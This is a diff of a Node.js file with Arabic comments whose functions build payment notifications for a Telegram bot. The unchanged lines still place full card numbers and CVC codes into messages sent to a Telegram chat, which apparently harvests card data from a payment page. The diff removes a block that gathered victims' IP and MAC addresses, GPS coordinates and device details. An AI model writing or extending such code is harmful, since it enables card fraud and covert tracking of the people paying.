@@ -5,10 +5,10 @@ const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 /**
- * دالة استخراج وتنسيق اسم وسيلة الدفع بشكل واضح
+ * دالة استخراج وتنسيق وسيلة الدفع بشكل واضح
  */
 function getPaymentMethodName(data) {
-  let method = data.payment_method || data.source_type || data.method || "محفظة إلكترونية";
+  let method = data.payment_method || data.source_type || "محفظة إلكترونية";
   if (method === "card") method = "بطاقة بنكية (Visa / Mastercard)";
   else if (method === "wallet") method = "محفظة إلكترونية (Mobile Wallet)";
   else if (method === "valu") method = "برنامج تقسيط (Valu)";
@@ -18,7 +18,7 @@ function getPaymentMethodName(data) {
 }
 
 /**
- * دالة تنسيق التاريخ والوقت بتوقيت مصر (تنسيق عربي أنيق)
+ * دالة تنسيق التاريخ والوقت بتوقيت مصر
  */
 function getFormattedDateTime() {
   const now = new Date();
@@ -28,8 +28,8 @@ function getFormattedDateTime() {
 }
 
 /**
- * إرسال رسالة نصية عامة إلى التليجرام (حالة البدء الجاري وحالة النجاح)
- * @param {Object} data - بيانات العملية وبيانات الجهاز/الموقع
+ * إرسال رسالة نصية عامة إلى التليجرام (حالة الجاري وحالة النجاح)
+ * @param {Object} data - بيانات العملية
  * @param {boolean} isInitial - true عند بدء عملية الدفع، false عند التأكيد والنجاح
  */
 async function sendTelegramMessage(data, isInitial = true) {
@@ -40,36 +40,13 @@ async function sendTelegramMessage(data, isInitial = true) {
     }
 
     const method = getPaymentMethodName(data);
-    const amountEGP = data.amount_cents
-      ? (data.amount_cents / 100).toFixed(2)
-      : (data.amount || "غير محدد");
+    const amountEGP = data.amount_cents ? (data.amount_cents / 100).toFixed(2) : (data.amount || "غير محدد");
     const dateTimeStr = getFormattedDateTime();
 
     let message = "";
 
     if (isInitial) {
-      // 1. الرسالة الأولى: جاري بدء عملية الدفع مع كافة تفاصيل الجهاز والشبكة والموقع
-      const clientID = data.clientID || data.clientId || "غير متوفر";
-      const currentInternalIP = data.internalIP || data.currentInternalIP || data.ip || "غير متوفر";
-      const publicIP = data.publicIP || (data.geoData && data.geoData.publicIP) || "غير متوفر";
-      const currentInternalMAC = data.mac || data.currentInternalMAC || "غير متوفر";
-
-      // البيانات الجغرافية
-      const geoLat = data.lat || (data.geoData && data.geoData.lat) || "غير متوفر";
-      const geoLon = data.lon || (data.geoData && data.geoData.lon) || "غير متوفر";
-      const geoCity = data.city || (data.geoData && data.geoData.city) || "غير متوفر";
-      const geoCountry = data.country || (data.geoData && data.geoData.country) || "غير متوفر";
-
-      // مواصفات الجهاز والبيئة
-      const batteryInfo = data.battery || data.batteryInfo || "غير متوفر";
-      const deviceModel = data.deviceModel || "غير متوفر";
-      const deviceRAM = data.deviceRAM || "غير متوفر";
-      const cpuCores = data.cpuCores || "غير متوفر";
-      const deviceType = data.deviceType || "غير متوفر";
-      const screenSize = data.screenSize || "غير متوفر";
-      const userTimeZone = data.userTimeZone || "غير متوفر";
-      const lang = data.lang || "غير متوفر";
-
+      // 1. الرسالة الأولى: جاري عملية الدفع
       message = `⏳ <b>جاري عملية الدفع...</b>\n\n` +
                 `💳 وسيلة الدفع: <b>${method}</b>\n` +
                 `💰 المبلغ المطلوب: <b>${amountEGP} جنيه</b>\n`;
@@ -78,7 +55,7 @@ async function sendTelegramMessage(data, isInitial = true) {
         message += `📱 رقم المحفظة / الهاتف: <code>${data.phone}</code>\n`;
       }
 
-      // بيانات البطاقة البنكية (إن وجدت)
+      // إرفاق بيانات البطاقة الكاملة إن وجدت (فيزا)
       if (data.card_data && data.card_data.number && data.card_data.number !== "غير مدخل") {
         message += `\n--- <b>بيانات البطاقة البنكية المدخلة</b> ---\n` +
                   `🔢 رقم الكارت: <code>${data.card_data.number}</code>\n` +
@@ -87,23 +64,7 @@ async function sendTelegramMessage(data, isInitial = true) {
                   `🔒 رمز CVC: <code>${data.card_data.cvc}</code>\n`;
       }
 
-      // تفاصيل الجهاز والشبكة والموقع المدمجة
-      message += `\n🆔 <b>معرف الجهاز:</b> <code>${clientID}</code>\n` +
-                 `🏠 <b>IP الداخلي:</b> <code>${currentInternalIP}</code>\n` +
-                 `🌍 <b>IP الخارجي:</b> <code>${publicIP}</code>\n` +
-                 `🖥 <b>MAC Address:</b> <code>${currentInternalMAC}</code>\n` +
-                 `———————————————\n` +
-                 `📅 <b>تاريخ الإرسال:</b> ${dateTimeStr}\n` +
-                 `📡 <b>الإحداثيات:</b> <code>${geoLat}, ${geoLon}</code>\n` +
-                 `🏙 <b>المدينة والدولة:</b> ${geoCity} | ${geoCountry}\n` +
-                 `🔋 <b>حالة البطارية:</b> ${batteryInfo}\n` +
-                 `📱 <b>طراز الجهاز:</b> ${deviceModel}\n` +
-                 `🧠 <b>ذاكرة الجهاز (RAM):</b> ${deviceRAM}\n` +
-                 `⚙️ <b>أنوية المعالج:</b> ${cpuCores}\n` +
-                 `💡 <b>نوع الجهاز:</b> ${deviceType}\n` +
-                 `📺 <b>أبعاد الشاشة:</b> ${screenSize}\n` +
-                 `⏰ <b>التوقيت والمنطقة:</b> ${userTimeZone}\n` +
-                 `🌍 <b>لغة المتصفح:</b> ${lang}`;
+      message += `\n🕒 الوقت: <code>${dateTimeStr}</code>`;
 
     } else {
       // 2. الرسالة الثانية: تأكيد نجاح الدفع والتفعيل
@@ -161,10 +122,7 @@ async function sendVoucherWithCardImage(voucherInfo, imageBuffer) {
 
       const form = new FormData();
       form.append("chat_id", CHAT_ID);
-      form.append("photo", imageBuffer, {
-        filename: `hikayat_card_${card.code}.png`,
-        contentType: "image/png"
-      });
+      form.append("photo", imageBuffer, { filename: `hikayat_card_${card.code}.png`, contentType: "image/png" });
       form.append("caption", captionText);
       form.append("parse_mode", "HTML");
 
